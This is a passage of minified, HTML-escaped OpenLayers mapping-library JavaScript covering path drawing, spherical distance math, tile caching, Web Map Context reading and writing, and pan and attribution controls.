.length-1]);this.removePoint();this.finalize()&#125;,dblclick:function(a)&#123;this.freehandMode(a)||this.finishGeometry();return!1&#125;,CLASS_NAME:"OpenLayers.Handler.Path"&#125;);OpenLayers.Spherical=OpenLayers.Spherical||&#123;&#125;;OpenLayers.Spherical.DEFAULT_RADIUS=6378137;OpenLayers.Spherical.computeDistanceBetween=function(a,b,c)&#123;c=c||OpenLayers.Spherical.DEFAULT_RADIUS;var d=Math.sin(Math.PI*(b.lon-a.lon)/360),e=Math.sin(Math.PI*(b.lat-a.lat)/360);a=e*e+d*d*Math.cos(Math.PI*a.lat/180)*Math.cos(Math.PI*b.lat/180);return 2*c*Math.atan2(Math.sqrt(a),Math.sqrt(1-a))&#125;;OpenLayers.Spherical.computeHeading=function(a,b)&#123;var c=Math.sin(Math.PI*(a.lon-b.lon)/180)*Math.cos(Math.PI*b.lat/180),d=Math.cos(Math.PI*a.lat/180)*Math.sin(Math.PI*b.lat/180)-Math.sin(Math.PI*a.lat/180)*Math.cos(Math.PI*b.lat/180)*Math.cos(Math.PI*(a.lon-b.lon)/180);return 180*Math.atan2(c,d)/Math.PI&#125;;OpenLayers.Control.CacheWrite=OpenLayers.Class(OpenLayers.Control,&#123;layers:null,imageFormat:"image/png",quotaRegEx:/quota/i,setMap:function(a)&#123;OpenLayers.Control.prototype.setMap.apply(this,arguments);var b,c=this.layers||a.layers;for(b=c.length-1;0&lt;=b;--b)this.addLayer(&#123;layer:c[b]&#125;);if(!this.layers)a.events.on(&#123;addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this&#125;)&#125;,addLayer:function(a)&#123;a.layer.events.on(&#123;tileloadstart:this.makeSameOrigin,tileloaded:this.onTileLoaded,scope:this&#125;)&#125;,removeLayer:function(a)&#123;a.layer.events.un(&#123;tileloadstart:this.makeSameOrigin,tileloaded:this.onTileLoaded,scope:this&#125;)&#125;,makeSameOrigin:function(a)&#123;if(this.active&amp;&amp;(a=a.tile,a instanceof OpenLayers.Tile.Image&amp;&amp;!a.crossOriginKeyword&amp;&amp;"data:"!==a.url.substr(0,5)))&#123;var b=OpenLayers.Request.makeSameOrigin(a.url,OpenLayers.ProxyHost);OpenLayers.Control.CacheWrite.urlMap[b]=a.url;a.url=b&#125;&#125;,onTileLoaded:function(a)&#123;this.active&amp;&amp;(!a.aborted&amp;&amp;a.tile instanceof OpenLayers.Tile.Image&amp;&amp;"data:"!==a.tile.url.substr(0,5))&amp;&amp;(this.cache(&#123;tile:a.tile&#125;),delete OpenLayers.Control.CacheWrite.urlMap[a.tile.url])&#125;,cache:function(a)&#123;if(window.localStorage)&#123;a=a.tile;try&#123;var b=a.getCanvasContext();b&amp;&amp;window.localStorage.setItem("olCache_"+(OpenLayers.Control.CacheWrite.urlMap[a.url]||a.url),b.canvas.toDataURL(this.imageFormat))&#125;catch(c)&#123;(b=c.name||c.message)&amp;&amp;this.quotaRegEx.test(b)?this.events.triggerEvent("cachefull",&#123;tile:a&#125;):OpenLayers.Console.error(c.toString())&#125;&#125;&#125;,destroy:function()&#123;if(this.layers||this.map)&#123;var a,b=this.layers||this.map.layers;for(a=b.length-1;0&lt;=a;--a)this.removeLayer(&#123;layer:b[a]&#125;)&#125;this.map&amp;&amp;this.map.events.un(&#123;addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this&#125;);OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Control.CacheWrite"&#125;);OpenLayers.Control.CacheWrite.clearCache=function()&#123;if(window.localStorage)&#123;var a,b;for(a=window.localStorage.length-1;0&lt;=a;--a)b=window.localStorage.key(a),"olCache_"===b.substr(0,8)&amp;&amp;window.localStorage.removeItem(b)&#125;&#125;;OpenLayers.Control.CacheWrite.urlMap=&#123;&#125;;OpenLayers.Format.Context=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;layerOptions:null,layerParams:null,read:function(a,b)&#123;var c=OpenLayers.Format.XML.VersionedOGC.prototype.read.apply(this,arguments);if(b&amp;&amp;b.map)if(this.context=c,b.map instanceof OpenLayers.Map)c=this.mergeContextToMap(c,b.map);else&#123;var d=b.map;if(OpenLayers.Util.isElement(d)||"string"==typeof d)d=&#123;div:d&#125;;c=this.contextToMap(c,d)&#125;return c&#125;,getLayerFromContext:function(a)&#123;var b,c,d=&#123;queryable:a.queryable,visibility:a.visibility,maxExtent:a.maxExtent,metadata:OpenLayers.Util.applyDefaults(a.metadata,&#123;styles:a.styles,formats:a.formats,"abstract":a["abstract"],dataURL:a.dataURL&#125;),numZoomLevels:a.numZoomLevels,units:a.units,isBaseLayer:a.isBaseLayer,opacity:a.opacity,displayInLayerSwitcher:a.displayInLayerSwitcher,singleTile:a.singleTile,tileSize:a.tileSize?new OpenLayers.Size(a.tileSize.width,a.tileSize.height):void 0,minScale:a.minScale||a.maxScaleDenominator,maxScale:a.maxScale||a.minScaleDenominator,srs:a.srs,dimensions:a.dimensions,metadataURL:a.metadataURL&#125;;this.layerOptions&amp;&amp;OpenLayers.Util.applyDefaults(d,this.layerOptions);var e=&#123;layers:a.name,transparent:a.transparent,version:a.version&#125;;if(a.formats&amp;&amp;0&lt;a.formats.length)for(e.format=a.formats[0].value,b=0,c=a.formats.length;b&lt;c;b++)&#123;var f=a.formats[b];if(!0==f.current)&#123;e.format=f.value;break&#125;&#125;if(a.styles&amp;&amp;0&lt;a.styles.length)for(b=0,c=a.styles.length;b&lt;c;b++)if(f=a.styles[b],!0==f.current)&#123;f.href?e.sld=f.href:f.body?e.sld_body=f.body:e.styles=f.name;break&#125;this.layerParams&amp;&amp;OpenLayers.Util.applyDefaults(e,this.layerParams);b=null;c=a.service;c==OpenLayers.Format.Context.serviceTypes.WFS?(d.strategies=[new OpenLayers.Strategy.BBOX],d.protocol=new OpenLayers.Protocol.WFS(&#123;url:a.url,featurePrefix:a.name.split(":")[0],featureType:a.name.split(":").pop()&#125;),b=new OpenLayers.Layer.Vector(a.title||a.name,d)):c==OpenLayers.Format.Context.serviceTypes.KML?(d.strategies=[new OpenLayers.Strategy.Fixed],d.protocol=new OpenLayers.Protocol.HTTP(&#123;url:a.url,format:new OpenLayers.Format.KML&#125;),b=new OpenLayers.Layer.Vector(a.title||a.name,d)):c==OpenLayers.Format.Context.serviceTypes.GML?(d.strategies=[new OpenLayers.Strategy.Fixed],d.protocol=new OpenLayers.Protocol.HTTP(&#123;url:a.url,format:new OpenLayers.Format.GML&#125;),b=new OpenLayers.Layer.Vector(a.title||a.name,d)):a.features?(b=new OpenLayers.Layer.Vector(a.title||a.name,d),b.addFeatures(a.features)):!0!==a.categoryLayer&amp;&amp;(b=new OpenLayers.Layer.WMS(a.title||a.name,a.url,e,d));return b&#125;,getLayersFromContext:function(a)&#123;for(var b=[],c=0,d=a.length;c&lt;d;c++)&#123;var e=this.getLayerFromContext(a[c]);null!==e&amp;&amp;b.push(e)&#125;return b&#125;,contextToMap:function(a,b)&#123;b=OpenLayers.Util.applyDefaults(&#123;maxExtent:a.maxExtent,projection:a.projection,units:a.units&#125;,b);b.maxExtent&amp;&amp;(b.maxResolution=b.maxExtent.getWidth()/OpenLayers.Map.TILE_WIDTH);b.metadata=&#123;contactInformation:a.contactInformation,"abstract":a["abstract"],keywords:a.keywords,logo:a.logo,descriptionURL:a.descriptionURL&#125;;var c=new OpenLayers.Map(b);c.addLayers(this.getLayersFromContext(a.layersContext));c.setCenter(a.bounds.getCenterLonLat(),c.getZoomForExtent(a.bounds,!0));return c&#125;,mergeContextToMap:function(a,b)&#123;b.addLayers(this.getLayersFromContext(a.layersContext));return b&#125;,write:function(a,b)&#123;a=this.toContext(a);return OpenLayers.Format.XML.VersionedOGC.prototype.write.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Format.Context"&#125;);OpenLayers.Format.Context.serviceTypes=&#123;WMS:"urn:ogc:serviceType:WMS",WFS:"urn:ogc:serviceType:WFS",WCS:"urn:ogc:serviceType:WCS",GML:"urn:ogc:serviceType:GML",SLD:"urn:ogc:serviceType:SLD",FES:"urn:ogc:serviceType:FES",KML:"urn:ogc:serviceType:KML"&#125;;OpenLayers.Format.WMC=OpenLayers.Class(OpenLayers.Format.Context,&#123;defaultVersion:"1.1.0",layerToContext:function(a)&#123;var b=this.getParser(),c=&#123;queryable:a.queryable,visibility:a.visibility,name:a.params.LAYERS,title:a.name,"abstract":a.metadata["abstract"],dataURL:a.metadata.dataURL,metadataURL:a.metadataURL,server:&#123;version:a.params.VERSION,url:a.url&#125;,maxExtent:a.maxExtent,transparent:a.params.TRANSPARENT,numZoomLevels:a.numZoomLevels,units:a.units,isBaseLayer:a.isBaseLayer,opacity:1==a.opacity?void 0:a.opacity,displayInLayerSwitcher:a.displayInLayerSwitcher,singleTile:a.singleTile,tileSize:a.singleTile||!a.tileSize?void 0:&#123;width:a.tileSize.w,height:a.tileSize.h&#125;,minScale:a.options.resolutions||a.options.scales||a.options.maxResolution||a.options.minScale?a.minScale:void 0,maxScale:a.options.resolutions||a.options.scales||a.options.minResolution||a.options.maxScale?a.maxScale:void 0,formats:[],styles:[],srs:a.srs,dimensions:a.dimensions&#125;;a.metadata.servertitle&amp;&amp;(c.server.title=a.metadata.servertitle);if(a.metadata.formats&amp;&amp;0&lt;a.metadata.formats.length)for(var d=0,e=a.metadata.formats.length;d&lt;e;d++)&#123;var f=a.metadata.formats[d];c.formats.push(&#123;value:f.value,current:f.value==a.params.FORMAT&#125;)&#125;else c.formats.push(&#123;value:a.params.FORMAT,current:!0&#125;);if(a.metadata.styles&amp;&amp;0&lt;a.metadata.styles.length)for(d=0,e=a.metadata.styles.length;d&lt;e;d++)b=a.metadata.styles[d],b.current=b.href==a.params.SLD||b.body==a.params.SLD_BODY||b.name==a.params.STYLES?!0:!1,c.styles.push(b);else c.styles.push(&#123;href:a.params.SLD,body:a.params.SLD_BODY,name:a.params.STYLES||b.defaultStyleName,title:b.defaultStyleTitle,current:!0&#125;);return c&#125;,toContext:function(a)&#123;var b=&#123;&#125;,c=a.layers;if("OpenLayers.Map"==a.CLASS_NAME)&#123;var d=a.metadata||&#123;&#125;;b.size=a.getSize();b.bounds=a.getExtent();b.projection=a.projection;b.title=a.title;b.keywords=d.keywords;b["abstract"]=d["abstract"];b.logo=d.logo;b.descriptionURL=d.descriptionURL;b.contactInformation=d.contactInformation;b.maxExtent=a.maxExtent&#125;else OpenLayers.Util.applyDefaults(b,a),void 0!=b.layers&amp;&amp;delete b.layers;void 0==b.layersContext&amp;&amp;(b.layersContext=[]);if(void 0!=c&amp;&amp;OpenLayers.Util.isArray(c))for(a=0,d=c.length;a&lt;d;a++)&#123;var e=c[a];e instanceof OpenLayers.Layer.WMS&amp;&amp;b.layersContext.push(this.layerToContext(e))&#125;return b&#125;,CLASS_NAME:"OpenLayers.Format.WMC"&#125;);OpenLayers.Format.WMC.v1=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;ol:"http://openlayers.org/context",wmc:"http://www.opengis.net/context",sld:"http://www.opengis.net/sld",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,schemaLocation:"",getNamespacePrefix:function(a)&#123;var b=null;if(null==a)b=this.namespaces[this.defaultPrefix];else for(b in this.namespaces)if(this.namespaces[b]==a)break;return b&#125;,defaultPrefix:"wmc",rootPrefix:null,defaultStyleName:"",defaultStyleTitle:"Default",initialize:function(a)&#123;OpenLayers.Format.XML.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a=a.documentElement;this.rootPrefix=a.prefix;var b=&#123;version:a.getAttribute("version")&#125;;this.runChildNodes(b,a);return b&#125;,runChildNodes:function(a,b)&#123;for(var c=b.childNodes,d,e,f,g=0,h=c.length;g&lt;h;++g)d=c[g],1==d.nodeType&amp;&amp;(e=this.getNamespacePrefix(d.namespaceURI),f=d.nodeName.split(":").pop(),(e=this["read_"+e+"_"+f])&amp;&amp;e.apply(this,[a,d]))&#125;,read_wmc_General:function(a,b)&#123;this.runChildNodes(a,b)&#125;,read_wmc_BoundingBox:function(a,b)&#123;a.projection=b.getAttribute("SRS");a.bounds=new OpenLayers.Bounds(b.getAttribute("minx"),b.getAttribute("miny"),b.getAttribute("maxx"),b.getAttribute("maxy"))&#125;,read_wmc_LayerList:function(a,b)&#123;a.layersContext=[];this.runChildNodes(a,b)&#125;,read_wmc_Layer:function(a,b)&#123;var c=&#123;visibility:"1"!=b.getAttribute("hidden"),queryable:"1"==b.getAttribute("queryable"),formats:[],styles:[],metadata:&#123;&#125;&#125;;this.runChildNodes(c,b);a.layersContext.push(c)&#125;,read_wmc_Extension:function(a,b)&#123;this.runChildNodes(a,b)&#125;,read_ol_units:function(a,b)&#123;a.units=this.getChildValue(b)&#125;,read_ol_maxExtent:function(a,b)&#123;var c=new OpenLayers.Bounds(b.getAttribute("minx"),b.getAttribute("miny"),b.getAttribute("maxx"),b.getAttribute("maxy"));a.maxExtent=c&#125;,read_ol_transparent:function(a,b)&#123;a.transparent=this.getChildValue(b)&#125;,read_ol_numZoomLevels:function(a,b)&#123;a.numZoomLevels=parseInt(this.getChildValue(b))&#125;,read_ol_opacity:function(a,b)&#123;a.opacity=parseFloat(this.getChildValue(b))&#125;,read_ol_singleTile:function(a,b)&#123;a.singleTile="true"==this.getChildValue(b)&#125;,read_ol_tileSize:function(a,b)&#123;var c=&#123;width:b.getAttribute("width"),height:b.getAttribute("height")&#125;;a.tileSize=c&#125;,read_ol_isBaseLayer:function(a,b)&#123;a.isBaseLayer="true"==this.getChildValue(b)&#125;,read_ol_displayInLayerSwitcher:function(a,b)&#123;a.displayInLayerSwitcher="true"==this.getChildValue(b)&#125;,read_wmc_Server:function(a,b)&#123;a.version=b.getAttribute("version");a.url=this.getOnlineResource_href(b);a.metadata.servertitle=b.getAttribute("title")&#125;,read_wmc_FormatList:function(a,b)&#123;this.runChildNodes(a,b)&#125;,read_wmc_Format:function(a,b)&#123;var c=&#123;value:this.getChildValue(b)&#125;;"1"==b.getAttribute("current")&amp;&amp;(c.current=!0);a.formats.push(c)&#125;,read_wmc_StyleList:function(a,b)&#123;this.runChildNodes(a,b)&#125;,read_wmc_Style:function(a,b)&#123;var c=&#123;&#125;;this.runChildNodes(c,b);"1"==b.getAttribute("current")&amp;&amp;(c.current=!0);a.styles.push(c)&#125;,read_wmc_SLD:function(a,b)&#123;this.runChildNodes(a,b)&#125;,read_sld_StyledLayerDescriptor:function(a,b)&#123;var c=OpenLayers.Format.XML.prototype.write.apply(this,[b]);a.body=c&#125;,read_sld_FeatureTypeStyle:function(a,b)&#123;var c=OpenLayers.Format.XML.prototype.write.apply(this,[b]);a.body=c&#125;,read_wmc_OnlineResource:function(a,b)&#123;a.href=this.getAttributeNS(b,this.namespaces.xlink,"href")&#125;,read_wmc_Name:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.name=c)&#125;,read_wmc_Title:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.title=c)&#125;,read_wmc_MetadataURL:function(a,b)&#123;a.metadataURL=this.getOnlineResource_href(b)&#125;,read_wmc_KeywordList:function(a,b)&#123;a.keywords=[];this.runChildNodes(a.keywords,b)&#125;,read_wmc_Keyword:function(a,b)&#123;a.push(this.getChildValue(b))&#125;,read_wmc_Abstract:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a["abstract"]=c)&#125;,read_wmc_LogoURL:function(a,b)&#123;a.logo=&#123;width:b.getAttribute("width"),height:b.getAttribute("height"),format:b.getAttribute("format"),href:this.getOnlineResource_href(b)&#125;&#125;,read_wmc_DescriptionURL:function(a,b)&#123;a.descriptionURL=this.getOnlineResource_href(b)&#125;,read_wmc_ContactInformation:function(a,b)&#123;var c=&#123;&#125;;this.runChildNodes(c,b);a.contactInformation=c&#125;,read_wmc_ContactPersonPrimary:function(a,b)&#123;var c=&#123;&#125;;this.runChildNodes(c,b);a.personPrimary=c&#125;,read_wmc_ContactPerson:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.person=c)&#125;,read_wmc_ContactOrganization:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.organization=c)&#125;,read_wmc_ContactPosition:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.position=c)&#125;,read_wmc_ContactAddress:function(a,b)&#123;var c=&#123;&#125;;this.runChildNodes(c,b);a.contactAddress=c&#125;,read_wmc_AddressType:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.type=c)&#125;,read_wmc_Address:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.address=c)&#125;,read_wmc_City:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.city=c)&#125;,read_wmc_StateOrProvince:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.stateOrProvince=c)&#125;,read_wmc_PostCode:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.postcode=c)&#125;,read_wmc_Country:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.country=c)&#125;,read_wmc_ContactVoiceTelephone:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.phone=c)&#125;,read_wmc_ContactFacsimileTelephone:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.fax=c)&#125;,read_wmc_ContactElectronicMailAddress:function(a,b)&#123;var c=this.getChildValue(b);c&amp;&amp;(a.email=c)&#125;,read_wmc_DataURL:function(a,b)&#123;a.dataURL=this.getOnlineResource_href(b)&#125;,read_wmc_LegendURL:function(a,b)&#123;var c=&#123;width:b.getAttribute("width"),height:b.getAttribute("height"),format:b.getAttribute("format"),href:this.getOnlineResource_href(b)&#125;;a.legend=c&#125;,read_wmc_DimensionList:function(a,b)&#123;a.dimensions=&#123;&#125;;this.runChildNodes(a.dimensions,b)&#125;,read_wmc_Dimension:function(a,b)&#123;var c=&#123;name:b.getAttribute("name").toLowerCase(),units:b.getAttribute("units")||"",unitSymbol:b.getAttribute("unitSymbol")||"",userValue:b.getAttribute("userValue")||"",nearestValue:"1"===b.getAttribute("nearestValue"),multipleValues:"1"===b.getAttribute("multipleValues"),current:"1"===b.getAttribute("current"),"default":b.getAttribute("default")||""&#125;,d=this.getChildValue(b);c.values=d.split(",");a[c.name]=c&#125;,write:function(a,b)&#123;var c=this.createElementDefaultNS("ViewContext");this.setAttributes(c,&#123;version:this.VERSION,id:b&amp;&amp;"string"==typeof b.id?b.id:OpenLayers.Util.createUniqueID("OpenLayers_Context_")&#125;);this.setAttributeNS(c,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);c.appendChild(this.write_wmc_General(a));c.appendChild(this.write_wmc_LayerList(a));return OpenLayers.Format.XML.prototype.write.apply(this,[c])&#125;,createElementDefaultNS:function(a,b,c)&#123;a=this.createElementNS(this.namespaces[this.defaultPrefix],a);b&amp;&amp;a.appendChild(this.createTextNode(b));c&amp;&amp;this.setAttributes(a,c);return a&#125;,setAttributes:function(a,b)&#123;var c,d;for(d in b)c=b[d].toString(),c.match(/[A-Z]/)?this.setAttributeNS(a,null,d,c):a.setAttribute(d,c)&#125;,write_wmc_General:function(a)&#123;var b=this.createElementDefaultNS("General");a.size&amp;&amp;b.appendChild(this.createElementDefaultNS("Window",null,&#123;width:a.size.w,height:a.size.h&#125;));var c=a.bounds;b.appendChild(this.createElementDefaultNS("BoundingBox",null,&#123;minx:c.left.toPrecision(18),miny:c.bottom.toPrecision(18),maxx:c.right.toPrecision(18),maxy:c.top.toPrecision(18),SRS:a.projection&#125;));b.appendChild(this.createElementDefaultNS("Title",a.title));a.keywords&amp;&amp;b.appendChild(this.write_wmc_KeywordList(a.keywords));a["abstract"]&amp;&amp;b.appendChild(this.createElementDefaultNS("Abstract",a["abstract"]));a.logo&amp;&amp;b.appendChild(this.write_wmc_URLType("LogoURL",a.logo.href,a.logo));a.descriptionURL&amp;&amp;b.appendChild(this.write_wmc_URLType("DescriptionURL",a.descriptionURL));a.contactInformation&amp;&amp;b.appendChild(this.write_wmc_ContactInformation(a.contactInformation));b.appendChild(this.write_ol_MapExtension(a));return b&#125;,write_wmc_KeywordList:function(a)&#123;for(var b=this.createElementDefaultNS("KeywordList"),c=0,d=a.length;c&lt;d;c++)b.appendChild(this.createElementDefaultNS("Keyword",a[c]));return b&#125;,write_wmc_ContactInformation:function(a)&#123;var b=this.createElementDefaultNS("ContactInformation");a.personPrimary&amp;&amp;b.appendChild(this.write_wmc_ContactPersonPrimary(a.personPrimary));a.position&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactPosition",a.position));a.contactAddress&amp;&amp;b.appendChild(this.write_wmc_ContactAddress(a.contactAddress));a.phone&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactVoiceTelephone",a.phone));a.fax&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactFacsimileTelephone",a.fax));a.email&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactElectronicMailAddress",a.email));return b&#125;,write_wmc_ContactPersonPrimary:function(a)&#123;var b=this.createElementDefaultNS("ContactPersonPrimary");a.person&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactPerson",a.person));a.organization&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactOrganization",a.organization));return b&#125;,write_wmc_ContactAddress:function(a)&#123;var b=this.createElementDefaultNS("ContactAddress");a.type&amp;&amp;b.appendChild(this.createElementDefaultNS("AddressType",a.type));a.address&amp;&amp;b.appendChild(this.createElementDefaultNS("Address",a.address));a.city&amp;&amp;b.appendChild(this.createElementDefaultNS("City",a.city));a.stateOrProvince&amp;&amp;b.appendChild(this.createElementDefaultNS("StateOrProvince",a.stateOrProvince));a.postcode&amp;&amp;b.appendChild(this.createElementDefaultNS("PostCode",a.postcode));a.country&amp;&amp;b.appendChild(this.createElementDefaultNS("Country",a.country));return b&#125;,write_ol_MapExtension:function(a)&#123;var b=this.createElementDefaultNS("Extension");if(a=a.maxExtent)&#123;var c=this.createElementNS(this.namespaces.ol,"ol:maxExtent");this.setAttributes(c,&#123;minx:a.left.toPrecision(18),miny:a.bottom.toPrecision(18),maxx:a.right.toPrecision(18),maxy:a.top.toPrecision(18)&#125;);b.appendChild(c)&#125;return b&#125;,write_wmc_LayerList:function(a)&#123;for(var b=this.createElementDefaultNS("LayerList"),c=0,d=a.layersContext.length;c&lt;d;++c)b.appendChild(this.write_wmc_Layer(a.layersContext[c]));return b&#125;,write_wmc_Layer:function(a)&#123;var b=this.createElementDefaultNS("Layer",null,&#123;queryable:a.queryable?"1":"0",hidden:a.visibility?"0":"1"&#125;);b.appendChild(this.write_wmc_Server(a));b.appendChild(this.createElementDefaultNS("Name",a.name));b.appendChild(this.createElementDefaultNS("Title",a.title));a["abstract"]&amp;&amp;b.appendChild(this.createElementDefaultNS("Abstract",a["abstract"]));a.dataURL&amp;&amp;b.appendChild(this.write_wmc_URLType("DataURL",a.dataURL));a.metadataURL&amp;&amp;b.appendChild(this.write_wmc_URLType("MetadataURL",a.metadataURL));return b&#125;,write_wmc_LayerExtension:function(a)&#123;var b=this.createElementDefaultNS("Extension"),c=a.maxExtent,d=this.createElementNS(this.namespaces.ol,"ol:maxExtent");this.setAttributes(d,&#123;minx:c.left.toPrecision(18),miny:c.bottom.toPrecision(18),maxx:c.right.toPrecision(18),maxy:c.top.toPrecision(18)&#125;);b.appendChild(d);a.tileSize&amp;&amp;!a.singleTile&amp;&amp;(c=this.createElementNS(this.namespaces.ol,"ol:tileSize"),this.setAttributes(c,a.tileSize),b.appendChild(c));for(var c="transparent numZoomLevels units isBaseLayer opacity displayInLayerSwitcher singleTile".split(" "),e=0,f=c.length;e&lt;f;++e)(d=this.createOLPropertyNode(a,c[e]))&amp;&amp;b.appendChild(d);return b&#125;,createOLPropertyNode:function(a,b)&#123;var c=null;null!=a[b]&amp;&amp;(c=this.createElementNS(this.namespaces.ol,"ol:"+b),c.appendChild(this.createTextNode(a[b].toString())));return c&#125;,write_wmc_Server:function(a)&#123;a=a.server;var b=this.createElementDefaultNS("Server"),c=&#123;service:"OGC:WMS",version:a.version&#125;;a.title&amp;&amp;(c.title=a.title);this.setAttributes(b,c);b.appendChild(this.write_wmc_OnlineResource(a.url));return b&#125;,write_wmc_URLType:function(a,b,c)&#123;a=this.createElementDefaultNS(a);a.appendChild(this.write_wmc_OnlineResource(b));if(c)&#123;b=["width","height","format"];for(var d=0;d&lt;b.length;d++)b[d]in c&amp;&amp;a.setAttribute(b[d],c[b[d]])&#125;return a&#125;,write_wmc_DimensionList:function(a)&#123;var b=this.createElementDefaultNS("DimensionList"),c;for(c in a.dimensions)&#123;var d=&#123;&#125;,e=a.dimensions[c],f;for(f in e)d[f]="boolean"==typeof e[f]?Number(e[f]):e[f];e="";d.values&amp;&amp;(e=d.values.join(","),delete d.values);b.appendChild(this.createElementDefaultNS("Dimension",e,d))&#125;return b&#125;,write_wmc_FormatList:function(a)&#123;for(var b=this.createElementDefaultNS("FormatList"),c=0,d=a.formats.length;c&lt;d;c++)&#123;var e=a.formats[c];b.appendChild(this.createElementDefaultNS("Format",e.value,e.current&amp;&amp;!0==e.current?&#123;current:"1"&#125;:null))&#125;return b&#125;,write_wmc_StyleList:function(a)&#123;var b=this.createElementDefaultNS("StyleList");if((a=a.styles)&amp;&amp;OpenLayers.Util.isArray(a))for(var c,d=0,e=a.length;d&lt;e;d++)&#123;var f=a[d],g=this.createElementDefaultNS("Style",null,f.current&amp;&amp;!0==f.current?&#123;current:"1"&#125;:null);f.href?(c=this.createElementDefaultNS("SLD"),f.name&amp;&amp;c.appendChild(this.createElementDefaultNS("Name",f.name)),f.title&amp;&amp;c.appendChild(this.createElementDefaultNS("Title",f.title)),f.legend&amp;&amp;c.appendChild(this.write_wmc_URLType("LegendURL",f.legend.href,f.legend)),f=this.write_wmc_OnlineResource(f.href),c.appendChild(f),g.appendChild(c)):f.body?(c=this.createElementDefaultNS("SLD"),f.name&amp;&amp;c.appendChild(this.createElementDefaultNS("Name",f.name)),f.title&amp;&amp;c.appendChild(this.createElementDefaultNS("Title",f.title)),f.legend&amp;&amp;c.appendChild(this.write_wmc_URLType("LegendURL",f.legend.href,f.legend)),f=OpenLayers.Format.XML.prototype.read.apply(this,[f.body]).documentElement,c.ownerDocument&amp;&amp;c.ownerDocument.importNode&amp;&amp;(f=c.ownerDocument.importNode(f,!0)),c.appendChild(f),g.appendChild(c)):(g.appendChild(this.createElementDefaultNS("Name",f.name)),g.appendChild(this.createElementDefaultNS("Title",f.title)),f["abstract"]&amp;&amp;g.appendChild(this.createElementDefaultNS("Abstract",f["abstract"])),f.legend&amp;&amp;g.appendChild(this.write_wmc_URLType("LegendURL",f.legend.href,f.legend)));b.appendChild(g)&#125;return b&#125;,write_wmc_OnlineResource:function(a)&#123;var b=this.createElementDefaultNS("OnlineResource");this.setAttributeNS(b,this.namespaces.xlink,"xlink:type","simple");this.setAttributeNS(b,this.namespaces.xlink,"xlink:href",a);return b&#125;,getOnlineResource_href:function(a)&#123;var b=&#123;&#125;;a=a.getElementsByTagName("OnlineResource");0&lt;a.length&amp;&amp;this.read_wmc_OnlineResource(b,a[0]);return b.href&#125;,CLASS_NAME:"OpenLayers.Format.WMC.v1"&#125;);OpenLayers.Control.PanPanel=OpenLayers.Class(OpenLayers.Control.Panel,&#123;slideFactor:50,slideRatio:null,initialize:function(a)&#123;OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);a=&#123;slideFactor:this.slideFactor,slideRatio:this.slideRatio&#125;;this.addControls([new OpenLayers.Control.Pan(OpenLayers.Control.Pan.NORTH,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.SOUTH,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.EAST,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.WEST,a)])&#125;,CLASS_NAME:"OpenLayers.Control.PanPanel"&#125;);OpenLayers.Control.Attribution=OpenLayers.Class(OpenLayers.Control,&#123;separator:", ",template:"$&#123;layers&#125;",destroy:function()&#123;this.map.events.un(&#123;removelayer:this.updateAttribution,addlayer:this.updateAttribution,changelayer:this.updateAttribution,changebaselayer:this.updateAttribution,scope:this&#125;);OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);this.map.events.on(&#123;changebaselayer:this.updateAttribution,changelayer:this.updateAttribution,addlayer:this.updateAttribution,removelayer:this.updateAttribution,scope:this&#125;);this.updateAttribution();return this.div&#125;,updateAttribution:function()&#123;var a=[];if(this.map&amp;&amp;this.map.layers)&#123;for(var b=0,c=this.map.layers.length;b&lt;c;b++)&#123;var d=this.map.layers[b];d.attribution&amp;&amp;d.getVisibility()&amp;&amp;-1===OpenLayers.Util.indexOf(a,d.attribution)&amp;&amp;a.push(d.attribution)&#125;this.div.innerHTML=OpenLayers.String.format(this.template,&#123;layers:a.join(this.separator)&#125;)&#125;&#125;,CLASS_NAME:"OpenLayers.Control.Attribution"&#125;);OpenLayers.Kinetic=OpenLayers.Class(&#123;threshold:0,deceleration:0.0035,nbPoints:100,delay:200,points:void 0,timerId:void 0,initialize:function(a)&#123;OpenLayers.Util.extend(this,a)&#125;,begin:function()&#123;OpenLayers.Animation.stop(this.timerId);this.timerId=void 0;this.points=[]&#125;,update:function(a)&#123;this.points.unshift(&#123;xy:a,tick:(new Date).getTime()&#125;);this.points.length&gt;this.nbPoints&amp;&amp;this.points.pop()&#125;,end:function(a)&#123;for(var b,c=(new 